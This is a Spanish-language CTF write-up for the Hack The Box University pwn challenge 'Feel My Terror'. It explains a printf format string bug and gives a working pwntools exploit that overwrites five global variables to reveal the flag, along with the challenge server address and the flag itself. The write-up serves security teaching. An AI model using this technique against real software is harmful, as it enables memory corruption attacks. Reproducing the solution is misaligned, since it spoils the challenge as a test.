# Feel My Terror - HTB University CTF Writeup

## Información del Reto

- **Categoría:** Pwn
- **Dificultad:** Fácil/Media
- **Flag:** `HTB{1_l0v3_chr15tm45_&_h4t3_fmt}`

## Descripción

> These mischievous elves have scrambled the good kids' addresses! Now the presents can't find their way home. Please help me fix them quickly — I can't sort this out on my own.

## Análisis Inicial

### Información del Binario

```bash
$ file feel_my_terror
feel_my_terror: ELF 64-bit LSB executable, x86-64, version 1 (SYSV),
dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, not stripped
```

### Protecciones

```
Partial RELRO
No PIE (direcciones fijas)
Stack Canary habilitado
NX habilitado
```

## Análisis Estático

### Funciones Principales

Usando `objdump -d` identifiqué las funciones clave:

1. **main()** - Función principal
2. **check_db()** - Verifica las direcciones y muestra la flag
3. **success()** - Imprime la flag si las verificaciones pasan

### Vulnerabilidad Identificada

En `main()` existe una vulnerabilidad de **Format String**:

```c
read(0, buffer, 0xc5);   // Lee input del usuario
printf(buffer);          // VULNERABILIDAD: printf sin formato
```

### Condiciones para Obtener la Flag

Analizando `check_db()`, el programa verifica 5 variables globales:

| Variable | Dirección | Valor Requerido |
|----------|-----------|-----------------|
| arg1 | 0x40402c | 0xdeadbeef |
| arg2 | 0x404034 | 0x1337c0de |
| arg3 | 0x40403c | 0xf337babe |
| arg4 | 0x404044 | 0x1337f337 |
| arg5 | 0x40404c | 0xfadeeeed |

Código de verificación (desensamblado):
```asm
mov    eax, [0x40402c]      ; arg1
cmp    eax, 0xdeadbeef
jne    fail

mov    eax, [0x404034]      ; arg2
cmp    eax, 0x1337c0de
jne    fail

mov    eax, [0x40403c]      ; arg3
cmp    eax, 0xf337babe
jne    fail

mov    eax, [0x404044]      ; arg4
cmp    eax, 0x1337f337
jne    fail

mov    eax, [0x40404c]      ; arg5
cmp    eax, 0xfadeeeed
jne    fail

call   success              ; ¡Flag!
```

## Explotación

### Paso 1: Encontrar el Offset del Format String

Envié un payload de prueba para encontrar dónde aparece mi input en el stack:

```
AAAABBBB.%p.%p.%p.%p.%p.%p.%p.%p
```

Output:
```
AAAABBBB.(nil).0x7ffd...0x4242424241414141...
                        ^-- Posición 6
```

**Offset = 6**

### Paso 2: Construir el Payload

Usando pwntools, construí un payload de format string que escribe los valores requeridos en las direcciones de las variables globales:

```python
from pwn import *

targets = {
    0x40402c: 0xdeadbeef,  # arg1
    0x404034: 0x1337c0de,  # arg2
    0x40403c: 0xf337babe,  # arg3
    0x404044: 0x1337f337,  # arg4
    0x40404c: 0xfadeeeed,  # arg5
}

payload = fmtstr_payload(6, targets, write_size='short')
```

La función `fmtstr_payload` genera automáticamente los especificadores de formato `%n` necesarios para escribir valores arbitrarios en memoria.

### Paso 3: Exploit Final

```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'

p = remote('154.57.164.67', 30562)

targets = {
    0x40402c: 0xdeadbeef,
    0x404034: 0x1337c0de,
    0x40403c: 0xf337babe,
    0x404044: 0x1337f337,
    0x40404c: 0xfadeeeed,
}

payload = fmtstr_payload(6, targets, write_size='short')

p.sendlineafter(b'> ', payload)
print(p.recvall(timeout=20).decode('latin-1'))
```

## Ejecución

```bash
$ python3 exploit.py
[+] Opening connection to 154.57.164.67 on port 30562: Done
[*] Payload length: 200
[+] FLAG: HTB{1_l0v3_chr15tm45_&_h4t3_fmt}
```

## Conceptos Clave

### Format String Attack

La vulnerabilidad ocurre cuando se pasa input del usuario directamente a `printf()` sin un formato especificado:

```c
printf(user_input);     // VULNERABLE
printf("%s", user_input); // SEGURO
```

Esto permite:
- **Leer memoria:** usando `%p`, `%x`, `%s`
- **Escribir memoria:** usando `%n` (escribe el número de bytes impresos)

### Por qué Funciona

1. El binario no tiene PIE, por lo que las direcciones son predecibles
2. Las variables `arg1-arg5` están en `.bss` con direcciones fijas
3. El especificador `%n` permite escribir valores en memoria
4. `pwntools` calcula automáticamente los anchos de campo necesarios

## Flag

```
HTB{1_l0v3_chr15tm45_&_h4t3_fmt}
```

*"I love Christmas & hate fmt"* - Referencia al ataque de format string usado.
